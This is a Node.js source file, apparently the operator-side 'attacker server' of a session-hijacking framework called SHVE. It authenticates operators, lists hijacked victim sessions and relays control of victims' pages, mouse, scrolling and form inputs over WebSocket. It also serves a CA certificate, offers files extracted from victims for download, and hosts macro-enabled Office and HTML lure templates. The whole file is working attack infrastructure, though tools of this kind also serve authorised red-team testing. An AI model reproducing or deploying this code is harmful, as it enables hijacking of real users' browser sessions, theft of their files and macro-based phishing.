const http = require('http');
const https = require('https');
const express = require('express');
const WebSocket = require('ws');
const cheerio = require('cheerio');
const url = require('url');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const { execSync } = require('child_process');
const { startServer: startVictimServer, getConnectedClients, startListening, stopListening } = require('./victimServer');
const multer = require('multer');

const upload = multer({ dest: 'public/templates/' }); 
const app = express();
const path = require('path');

const port = getPort('attackerServerPort');

let secret;
let wss

const sslEnabled = getConfigValue('sslEnabled');

app.use(express.urlencoded({ extended: true }))

function getPort(configKey) {
  const config = readConfig();
  return config[configKey];
}

function getConfigValue(configKey) {
  const config = readConfig();
  return config[configKey];
}

function readConfig() {
  let config;
  try {
    config = JSON.parse(fs.readFileSync('files/config.json'));
  } catch (err) {
    if (err.code === 'ENOENT') {
      console.log('No configuration found. Running "npm run setConfig" ...');
      execSync('npm run setConfig', { stdio: 'inherit' });
      config = JSON.parse(fs.readFileSync('files/config.json'));
    } else {
      throw err;
    }
  }

  return config;
}

try {
  secret = JSON.parse(fs.readFileSync('files/secret.json')).secret;
} catch (err) {
  if (err.code === 'ENOENT') {
    console.log('No secret found. Running "npm run regenerateToken" ...');
    execSync('npm run regenerateToken', { stdio: 'inherit' });
    secret = JSON.parse(fs.readFileSync('files/secret.json')).secret;
  } else {
    throw err;
  }
}

const connectedClients = {};

function verifyToken(req, res, next) {
  const token = req.headers['shve-authentication'];

  if (!token) {
    res.status(401).json({ error: 'No token provided' });
    return;
  }

  jwt.verify(token, secret, (err, decoded) => {
    if (err) {
      res.status(401).json({ error: 'Failed to authenticate token' });
      return;
    }

    req.username = decoded.username;
    next();
  });
}

function cleanHTML(html, baseURL) {
  if (!baseURL) {
    return html;
  }
  const $ = cheerio.load(html);
  $('img[src], script[src], link[href]').each((i, el) => {
    const $el = $(el);
    const src = $el.attr('src') || $el.attr('href');
    if (src && !src.match(/^(http|https|\/\/)/)) {
      const resolved = url.resolve(baseURL, src);
      $el.attr('src', resolved);
      $el.attr('href', resolved);
    }
  });
  return $.html();
}

function handleConnection(ws, req) {
  const shveHeader = req.headers['shve'];
  console.log(`New connection with SHVE header: ${shveHeader}`);

  if (shveHeader) {
    if (!connectedClients[shveHeader]) {
      startListening(shveHeader);
    }
    connectedClients[shveHeader] = ws;
  }

  const token = req.url.split('token=')[1];

  if (!token) {
    ws.send(JSON.stringify({ error: 'No token provided' }));
    ws.close();
    return;
  }

  jwt.verify(token, secret, (err, decoded) => {
    if (err) {
      ws.send(JSON.stringify({ error: 'Failed to authenticate token' }));
      ws.close();
      return;
    }

    ws.username = decoded.username;
  });
}

function handleDisconnection(ws, req) {
  const shveHeader = req.headers['shve'];
  console.log(`Connection with SHVE header ${shveHeader} closed`);

  if (shveHeader && connectedClients[shveHeader] === ws) {
    connectedClients[shveHeader] = null;
    if (!Object.values(connectedClients).some(client => client !== null && client !== ws)) {
      stopListening(shveHeader);
    }
  }
}

function writeDom(shve, data, baseURL) {
  const ws = connectedClients[shve];
  if (ws) {
    const dom = cleanHTML(data.dom, baseURL);
    const inputs = data.inputs;
    const scrollY = data.scrollY;
    const message = JSON.stringify({ 
      writeDom: { 
        data: {
          dom: dom,
          inputs,
          scrollY,
        }
      } 
    });
    ws.send(message);
  } else {
    console.log(`No proxy with shve ${shve} found`);
  }
}

function setMouse(shve, x, y) {
  const ws = connectedClients[shve];
  if (ws) {
    const message = JSON.stringify({ setMouse: { x, y } });
    ws.send(message);
  } else {
    console.log(`No proxy with shve ${shve} found`);
  }
}

function setScroll(shve, y) {
  const ws = connectedClients[shve];
  if (ws) {
    const message = JSON.stringify({ setScroll: { y } });
    ws.send(message);
  } else {
    console.log(`No proxy with shve ${shve} found`);
  }
}

function setInput(shve, value, path) {
  const ws = connectedClients[shve];
  if (ws) {
    const message = JSON.stringify({ setInput: { value, path } });
    ws.send(message);
  } else {
    console.log(`No proxy with shve ${shve} found`);
  }
}

app.post('/authenticate', (req, res) => {
  const { username, password } = req.body;

  fs.readFile('files/users.json', (err, data) => {
    if (err) {
      res.status(500).json({ error: 'Internal Server Error' });
      return;
    }

    const users = JSON.parse(data);
    const user = users.find(user => user.username === username);

    if (!user) {
      res.status(400).json({ error: 'Invalid username or password' });
      return;
    }

    bcrypt.compare(password, user.password, (err, match) => {
      if (err) {
        res.status(500).json({ error: 'Internal Server Error' });
        return;
      }

      if (!match) {
        res.status(400).json({ error: 'Invalid username or password' });
        return;
      }

      const token = jwt.sign({ username }, secret, { expiresIn: '1y' });
      res.json({ token });
    });
  });
});

app.get('/sessions/list', verifyToken, (req, res) => {
  const clients = getConnectedClients();
  res.json(clients);
});

app.get('/victimPort', verifyToken, (req, res) => {
  const victimPort = {"victimPort" : getPort('victimServerPort')};
  res.json(victimPort);
});

app.get('/certificate/download', verifyToken, (req, res) => {
  const certPath = path.join(__dirname, 'certs/certs', 'ca.pem');

  res.download(certPath, 'cert.pem', (err) => {
    if (err) {
      console.error(err);
      res.status(500).send('Error al descargar el certificado');
    }
  });
});

app.get('/files/list', verifyToken, (req, res) => {
  const directoryPath = path.join(__dirname, 'public/extractedFiles');

  fs.readdir(directoryPath, function (err, files) {
    if (err) {
      return res.status(500).send('Unable to scan directory: ' + err);
    }

    const filteredFiles = files.filter(file => file !== '.gitkeep');

    res.json(filteredFiles);
  });
});

app.get('/files/download/:uuid', verifyToken, (req, res) => {
  const uuid = req.params.uuid;
  const directoryPath = 'public/extractedFiles/';
  const filesInDirectory = fs.readdirSync(directoryPath);

  if (uuid.length !== 36) {
    return res.status(400).send('Invalid UUID length');
  }

  const matchingFile = filesInDirectory.find((file) => file.startsWith(uuid));

  if (matchingFile) {
    const filePath = path.join(directoryPath, matchingFile);
    res.download(filePath);  
  } else {
    res.status(404).send('File not found');
  }
});

app.delete('/files/delete/:uuid', verifyToken, (req, res) => {
  const uuid = req.params.uuid;
  if (uuid.length !== 36) {
    return res.status(400).send('Invalid UUID length');
  }

  const directoryPaths = [
    'public/extractedFiles/',
    'public/files/'
  ];

  directoryPaths.forEach(directoryPath => {
    const filesInDirectory = fs.readdirSync(directoryPath);

    const matchingFile = filesInDirectory.find((file) => file.startsWith(uuid));

    if (matchingFile) {
      const filePath = path.join(directoryPath, matchingFile);
      fs.unlinkSync(filePath); 
    }
  });

  res.status(200).send('File deleted successfully');
});

app.get('/templates/download/:templateName', verifyToken, (req, res) => {
  const { templateName } = req.params;
  const templates = ['template.docm', 'template.pptm', 'template.xlsm', 'template.html'];
  
  if (!templates.includes(templateName)) {
      return res.status(400).send('Invalid template name');
  }

  const filePath = path.join(__dirname, 'public/templates', templateName);
  res.download(filePath);
});

app.post('/templates/upload', verifyToken, upload.single('template'), (req, res) => {
    const { originalname } = req.file;
    const extension = originalname.split('.').pop();
    
    let newTemplateName;

    switch(extension) {
        case 'docm':
            newTemplateName = 'template.docm';
            break;
        case 'pptm':
            newTemplateName = 'template.pptm';
            break;
        case 'xlsm':
            newTemplateName = 'template.xlsm';
            break;
        case 'html':
            newTemplateName = 'template.html';
            break;
        default:
            return res.status(400).send('Invalid file extension');
    }

    const newPath = path.join(__dirname, 'public/templates', newTemplateName);
    fs.renameSync(req.file.path, newPath);
    res.status(200).send('Template uploaded successfully');
});

module.exports = {
  startServer: () => {
    if (sslEnabled) {
      const privateKey = fs.readFileSync('files/privateKey.pem', 'utf8');
      const certificate = fs.readFileSync('files/certificate.pem', 'utf8');
      const credentials = { key: privateKey, cert: certificate };
      const httpsServer = https.createServer(credentials, app);
      wss = new WebSocket.Server({ server: httpsServer });
      httpsServer.listen(port, () => {
        console.log(`Attacker server running on 0.0.0.0:${port} with SSL enabled`);
      });
    } else {
      const server = http.createServer(app);
      wss = new WebSocket.Server({ server });
      server.listen(port, () => {
        console.log(`Attacker server running on 0.0.0.0:${port}`);
      });
    }
    wss.on('connection', (ws, req) => {
      handleConnection(ws, req);
      
      ws.on('close', () => {
        handleDisconnection(ws, req);
      });
    });    
  },
  writeDom,
  setMouse,
  verifyToken,
  setScroll,
  setInput
};